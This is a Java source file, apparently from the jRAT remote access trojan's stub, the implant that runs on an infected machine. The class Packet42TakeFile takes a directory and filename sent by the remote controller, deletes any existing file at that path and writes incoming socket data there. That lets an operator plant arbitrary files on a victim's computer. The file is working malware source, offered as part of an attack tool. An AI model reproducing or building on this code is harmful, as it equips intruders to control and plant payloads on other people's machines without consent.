package su.jrat.stub.packets.incoming;

import java.io.File;

import su.jrat.common.io.FileIO;
import su.jrat.stub.Connection;
import su.jrat.stub.Main;


public class Packet42TakeFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String destdir = Connection.readLine();
		String filename = Connection.readLine();

		File file = new File(destdir + File.separator + filename);

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		FileIO fileio = new FileIO();
		fileio.readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.getKey());
	}

}
